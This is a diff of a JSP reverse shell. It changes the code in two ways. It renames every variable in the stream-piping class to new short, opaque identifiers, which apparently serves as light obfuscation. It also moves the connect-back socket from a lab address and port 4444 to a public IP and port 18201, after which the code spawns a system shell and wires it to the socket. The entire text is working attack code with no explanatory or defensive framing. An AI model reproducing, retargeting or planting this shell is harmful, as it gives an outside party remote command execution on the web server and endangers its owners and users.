@@ -6,37 +6,37 @@
 <%
   class StreamConnector extends Thread
   {
-    InputStream l3;
-    OutputStream ha;
+    InputStream qb;
+    OutputStream zG;
 
-    StreamConnector( InputStream l3, OutputStream ha )
+    StreamConnector( InputStream qb, OutputStream zG )
     {
-      this.l3 = l3;
-      this.ha = ha;
+      this.qb = qb;
+      this.zG = zG;
     }
 
     public void run()
     {
-      BufferedReader c0  = null;
-      BufferedWriter aLW = null;
+      BufferedReader mK  = null;
+      BufferedWriter cPR = null;
       try
       {
-        c0  = new BufferedReader( new InputStreamReader( this.l3 ) );
-        aLW = new BufferedWriter( new OutputStreamWriter( this.ha ) );
+        mK  = new BufferedReader( new InputStreamReader( this.qb ) );
+        cPR = new BufferedWriter( new OutputStreamWriter( this.zG ) );
         char buffer[] = new char[8192];
         int length;
-        while( ( length = c0.read( buffer, 0, buffer.length ) ) > 0 )
+        while( ( length = mK.read( buffer, 0, buffer.length ) ) > 0 )
         {
-          aLW.write( buffer, 0, length );
-          aLW.flush();
+          cPR.write( buffer, 0, length );
+          cPR.flush();
         }
       } catch( Exception e ){}
       try
       {
-        if( c0 != null )
-          c0.close();
-        if( aLW != null )
-          aLW.close();
+        if( mK != null )
+          mK.close();
+        if( cPR != null )
+          cPR.close();
       } catch( Exception e ){}
     }
   }
@@ -50,7 +50,7 @@ if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
   ShellPath = new String("cmd.exe");
 }
 
-    Socket socket = new Socket( "10.13.37.15", 4444 );
+    Socket socket = new Socket( "18.231.93.153", 18201 );
     Process process = Runtime.getRuntime().exec( ShellPath );
     ( new StreamConnector( process.getInputStream(), socket.getOutputStream() ) ).start();
     ( new StreamConnector( socket.getInputStream(), process.getOutputStream() ) ).start();
